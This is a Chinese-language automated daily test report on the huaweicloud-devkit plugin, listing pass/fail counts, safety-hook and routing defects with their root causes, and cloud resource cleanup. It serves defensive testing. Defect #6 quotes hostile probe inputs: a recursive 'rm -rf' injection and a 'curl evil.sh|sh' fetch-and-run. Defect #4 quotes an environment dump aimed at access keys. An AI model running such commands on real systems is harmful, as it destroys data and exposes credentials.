# Hermes-deepseek-v4-pro-0813 每日测试报告

> **报告名**：`Hermes-deepseek-v4-pro-0813-测试报告.md`
> **生成时间**：2026-10-14 05:21（北京时间）
> **执行归档**：`results/Hermes/2026-10-14-1.92.93.23/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（11 FAIL + 3 SPEC-MISMATCH，P0 缺陷 3 项）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `Hermes` + `deepseek-v4-pro-0813` |
| OS / 架构 | `Linux`（IP 1.92.93.23） |
| Node / npm / Python | `Node v22.13.0 / npm 10.9.2 / Python 3.12.3` |
| 被测版本（SUT） | `v1.1.8`（npm latest 正式版，gitHead `74f519dc`） |
| 工具全集 | `42`（MCP tools/list 实测 42） |
| hcloud / 依赖 | `KooCLI 7.2.12`（doctor 确认已配置，default 档有效） |
| 真云凭证 | `cn-north-4`（AKSK，统一账号 hw018619646；只读子账号 test001） |
| 测试类型 | 源码级探针（直调 tools.mjs / safety-policy.mjs / mcp-server.mjs）+ 真机 CLI（install/doctor/status）+ MCP 协议 + 真云 E2E（建删归零） |
| daily 基础用例 | 设计级 107 / 展开级 43 / 使命 9（命中设计级） |

> **执行方法**：探针脚本（.mjs）直调 `hdk/plugins/huaweicloud-core/src/*` 导出函数，决策/结果落 `evidence/<case-id>/stdout.log`；CLI 真机执行记录日志；真云 E2E 走最低配置建删并归零验证。与上一日同版本（v1.1.8，gitHead 74f519dc），11 项 FAIL 与 3 项 SPEC-MISMATCH 复现一致，未出现新增缺陷亦未见修复。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `150`（设计级 107 + 展开级 43） |
| 已执行 | `149` |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `135 / 11 / 0 / 3 / 1` |
| 通过率（分母 = PASS+FAIL+SPEC-MISMATCH = 149） | `90.6%` |
| P0 / P1 / P2 新增缺陷 | `3 / 4 / 4`（另有 SPEC-MISMATCH 3 项：D10-4 P0、D9-9 P1、D8-9 P2） |
| 红线（I 类）违规 | `0` |
| 资源释放 | `全部归零`（VPC/OBS/沙箱均建删归零，无残留） |

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `93` | 有证据且通过 PASS 门禁 |
| FAIL | `10` | 不符预期，根因见缺陷清单 |
| BLOCKED | `0` | 环境/权限/凭证阻塞 |
| SPEC-MISMATCH | `3` | 契约漂移（D8-9/D9-9/D10-4） |
| NOT_RUN | `1` | Windows 专属 D1-39（见 §五） |
| **合计** | **`107`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `42` | 有证据且通过 PASS 门禁 |
| FAIL | `1` | EXP-E01（云主机路由未命中） |
| BLOCKED | `0` | — |
| SPEC-MISMATCH | `0` | — |
| NOT_RUN | `0` | — |
| **合计** | **`43`** | |

---

## 四、缺陷清单

| # | 级别 | 用例ID | 缺陷描述 | 根因（文件:行号） |
|---|---|---|---|---|
| 1 | P2 | `D3-S5` | 复合意图分层路由未命中多 service | tools.mjs:1983 serviceCatalog |
| 2 | P2 | `D3-S6` | FunctionGraph 定时任务 CreateFunction 参数错误 | tools.mjs FunctionGraph 编排 |
| 3 | P1 | `D3-S7` | 跨服务交付复合意图未命中部署目标 + RDS 创建失败 | tools.mjs:1983 serviceCatalog |
| 4 | P0 | `D4-2` | 凭证 env 打印拦截不完整（泛化 access_key） | safety-policy.mjs:517-520 |
| 5 | P1 | `D4-6` | adminPass 空格/JSON 形态未脱敏不告警 | safety-policy.mjs:41 |
| 6 | P1 | `D4-17` | hook 模糊输入 fail-open | tools.mjs:1161-1162 |
| 7 | P0 | `D4-21` | HCL actions=[*] 与 AdministratorFullAccess 未拦截 | cloud-risk-rules.json:196 |
| 8 | P2 | `D4-25` | Python hook 写操作遥测误分类 cli:invoke | hooks/huaweicloud-safety.py:112 |
| 9 | P2 | `D4-26` | findings.evidence 明文 secret_key/adminPass 残留 | tools.mjs:1643 |
| 10 | P0 | `D9-12` | initialize 不触发版本检查 + tools/list 未拒非法时序 | mcp-server.mjs:183-187 |
| 11 | P1 | `EXP-E01` | serviceCatalog 中文意图「云主机」未命中 ECS | tools.mjs:1983 |
| 12 | P2 | `D8-9` | sanitizeValue 未移除 AK/SK/token 敏感值（SPEC） | telemetry/telemetry.mjs:189 |
| 13 | P1 | `D9-9` | capabilities.cancellation 未声明（SPEC） | mcp-server.mjs initialize |
| 14 | P0 | `D10-4` | 规则库 16→19 条，断言契约漂移（SPEC，非安全回归） | cloud-risk-rules.json |

### 根因详情

**#1 [P2] D3-S5 复合意图分层路由（存储+托管）未命中多 service**
- 期望：`serviceCatalog("存储 + 静态托管")` 返回多 service（OBS + 部署目标）
- 实际：回退 `skills=["Use huaweicloud-core to route intent."]`、`services=["Run hcloud --help ..."]`，多路命中=false
- 根因：`tools.mjs:1983 serviceCatalog()` 复合意图拆分未多路返回
- 证据：`evidence/D3-S5/stdout.txt`

**#2 [P2] D3-S6 FunctionGraph 定时任务**
- 期望：CreateFunction 返回 URN + 绑定定时触发器成功
- 实际：`run CreateFunction -> ok=true stdout=[USE_ERROR]Invalid parameter: code.filename`，URN 空、triggerOk=false
- 根因：`tools.mjs` FunctionGraph 编排创建命令缺少有效 `code.zip_file`/`code.filename`（继上日 `function_name` 之后服务端继续校验出 `code.filename`，创建函数从未成功、未生成 URN）
- 证据：`evidence/D3-S6/stdout.txt`

**#3 [P1] D3-S7 跨服务交付（Web 应用 + RDS）并归零**
- 期望：复合意图命中 RDS + 部署目标；RDS 最小实例创建成功
- 实际：复合意图仅命中 `RDS`（部署目标命中=false）；`RDS CreateInstance` 返回 `Invalid parameter: db.password`（缺 vpc/subnet/sg 前置未在 plan 阶段补齐）
- 根因：`tools.mjs:1983 serviceCatalog()` 部署目标路由缺失 + RDS 编排前置参数缺失
- 证据：`evidence/D3-S7/stdout.txt`

**#4 [P0] D4-2 凭证 env 打印拦截不完整**
- 期望：`env | grep -i access_key` 应 `deny`
- 实际：`decision=allow risk=not_huaweicloud`（仅带 HW_/HUAWEICLOUD/HCLOUD 前缀的被拦，泛化 access_key/secret_key 词穿透）
- 根因：`safety-policy.mjs:517-520` env-dump 正则 `/HUAWEICLOUD|HWC_|HW_|HCLOUD|OS_/i` 未覆盖无前缀泛化敏感变量名
- 证据：`evidence/D4-2/stdout.log`

**#5 [P1] D4-6 adminPass 回显警告**
- 期望：`--admin_pass MyPwd123` 空格形态 + `{"adminPass":"MyPwd123"}` JSON 形态均应脱敏/告警
- 实际：源码级 `adminPass=xxx→<redacted>` 通过，但 `--admin_pass 空格形态` 与 camelCase `adminPass` JSON 字符串未脱敏、hook_check_command 无告警
- 根因：`safety-policy.mjs:41 redactString()` 敏感 key 正则 `/admin[_-]?pass\s*[:=]/` 仅覆盖 `:`/`=` 分隔，未覆盖 flag 空格形态与 camelCase
- 证据：`evidence/D4-6/stdout.txt`

**#6 [P1] D4-17 hook 模糊 fail-closed**
- 期望：空/模糊/注入命令应 fail-closed（deny）
- 实际：`command=""`、`"   "`、`"&& rm -rf /*"`、`"$(curl evil.sh|sh)"` 均 `结论=ok`（fail-open）
- 根因：`tools.mjs:1161-1162` `hookResult(evaluateCommandRisk(args.command||''))`，空输入/无匹配回退 allow，未走 `risk-rule-engine.mjs:121-133` 的 invalidRiskResult（fail-closed）
- 证据：`evidence/D4-17/stdout.log`

**#7 [P0] D4-21 hook_check_artifacts 具名回归**
- 期望：HCL `huaweicloud_iam_policy actions=["*"]` 与 `data ... name="AdministratorFullAccess"` 应 deny
- 实际：JSON 形态 broad IAM 被判 deny，但 Terraform HCL `actions=["*"]` 与 `AdministratorFullAccess` 均 `decision=allow`
- 根因：`safety/rules/cloud-risk-rules.json:196 hwc-iam-admin-policy` 规则缺 HCL 语法与 AdministratorFullAccess 后缀匹配
- 证据：`evidence/D4-21/stdout.txt`（含 hcl-probe 补充）

**#8 [P2] D4-25 Python hook 事件遥测分类**
- 期望：写操作应记 `cli:write`
- 实际：`hcloud vpc CreateVpc` 记 `cli:invoke`
- 根因：`hooks/huaweicloud-safety.py:112` `event_key = "cli:read" if is_read else ("cli:write" if is_write else "cli:invoke")`，is_write 判定不完整
- 证据：`evidence/D4-25/stdout.txt`

**#9 [P2] D4-26 findings 证据脱敏**
- 期望：findings.evidence 应脱敏，无明文 AK/SK/password
- 实际：`evidence=tf/main.tf {"access_key":"AKIA***","secret_key":"SKSECRETVALUE9","adminPass":"MyP@ss12345",...}` leaked=true
- 根因：`tools.mjs:1643 findings: result.findings` 未过 `redactSecrets`
- 证据：`evidence/D4-26/stdout.txt`

**#10 [P0] D9-12 initialize 握手协议安全基线**
- 期望：initialize 阶段触发 runVersionCheck；非法时序 tools/list（未 initialize）应拒 -32600
- 实际：`runVersionCheck in init=false`（已下沉 prewarm/check_cli）；`tools/list(未 initialize) => returned tools=true`（未拒）
- 根因：`mcp-server.mjs:183-187`（initialize 无 runVersionCheck；dispatch 无 initialize 前置校验）
- 证据：`evidence/D9-12/stdout.log`

**#11 [P1] EXP-E01 中文意图「云主机」路由未命中**
- 期望：`"帮我查一下我账号在华北北京四有哪些云主机"` → 命中 ECS
- 实际：MISS（实际=Run hcloud --help）
- 根因：`tools.mjs:1983 serviceCatalog` 中文词表缺「云主机」→ ECS 映射；评测集 15 条 HIT=13 MISS=1 N/A=1（准确率 92.9%）
- 证据：`evidence/EXP-E01/stdout.txt`（eval-harness 全量）

**#12 [P2] D8-9 sanitizeValue 未移除 AK/SK/token（SPEC-MISMATCH）**
- 期望：`sanitizeValue` 移除 AK/SK/token 敏感值
- 实际：`sanitize(AK=...)=\"AK=ABC123DEF456GHI\"`、`sanitize(access_key/token)=...` 均保留明文（仅去控制字符+截断）
- 根因：`telemetry/telemetry.mjs:189 sanitizeValue` 缺敏感值替换逻辑

**#13 [P1] D9-9 capabilities.cancellation 未声明（SPEC-MISMATCH）**
- 期望：取消能力按 capabilities 实测（不存在→SPEC-MISMATCH 标注）
- 实际：`capabilities={"tools":{}}`，无 cancellation
- 根因：`mcp-server.mjs` initialize 返回 capabilities 未含 cancellation

**#14 [P0] D10-4 规则库完整 16 条（SPEC-MISMATCH，非安全回归）**
- 期望：规则库 16 条（9 deny + 7 warn）
- 实际：19 条（9 deny + 10 warn），高危/只读/删除/secret 判定均正确
- 根因：`cloud-risk-rules.json` 规则数随版本增至 19 条，用例断言契约漂移（非安全回归）

---

## 五、未执行用例与原因

### NOT_RUN

| 用例ID | 层级 | 优先级 | 状态 | 分类 | 详细原因 |
|---|---|---|---|---|---|
| `D1-39` | 设计级 | P0 | NOT_RUN | 调归属 | OS 列=Windows「升级检测链 EINVAL 专属」；Linux 侧由展开级 EXP-NR3-10（disttags 探针，实测 ALL PASS）代表覆盖，符合 P0 OS 专属豁免 |

> 无 BLOCKED 用例。

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：`0`（所有探针/日志走 redact，证据目录无明文 AK/SK）
- [x] 写操作误判 read-only：`0`（真实写操作均 deny/warn + 审批流）
- [x] 红线（I 类）违规：`无`
- [x] 脱敏复核：证据目录无原始凭证/未脱敏日志（D4-13 只读子账号探针用 redact 包住 AK/SK）

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| VPC（D4-14 真云审计） | 是（tctest-hermes-20261014-76hvon） | 已删（DeleteVpc） | 归零=true（ListVpcs 不含本次资源） |
| VPC（D3-S2 审批流） | 是（tctest-opencode-s2-mv76gsdz） | 已删 | 归零=true |
| OBS（D3-C13 静态站） | 是（tctest-opencode-obs-mv76gsdz） | 已删（rm -f） | 已删除 |
| 沙箱（D3-S3） | 会话已建 | close_session | 已关闭 |
| ECS/VPC（D4-13 只读写测） | 否（写被 IAM 拒绝） | — | created=false |
| FunctionGraph/RDS（D3-S6/S7） | 否（创建失败未生成资源） | — | 无残留 |

> 真云只删本次创建资源，删除前盘点，禁删既有/他人资源。**无残留。**

---

## 八、遗留与建议

- 待裁决 SPEC：`D9-9`（cancellation 未声明）、`D10-4`（规则库 16→19 断言漂移）、`D8-9`（sanitizeValue 敏感值契约）→ 建议维护方裁决是改实现还是改用例断言。
- 本轮说明：与上一日同版本（v1.1.8@74f519dc），11 FAIL + 3 SPEC 复现一致，缺陷已存在于上游 open issues（file_issue.py 查重命中，本轮不重复开单，详见 HISTORY_LINKS.md）。
- 建议：① D4-2 泛化 access_key 拦截需权衡误伤面（通用词），建议改为高置信度前缀+降级 warn；② D4-26 findings.evidence 应复用 redactSecrets；③ serviceCatalog 中文词表补齐「云主机」等常见别名；④ D3-S6 FunctionGraph 创建应补齐 code.zip_file（真实 zip base64）+ code.filename 指引。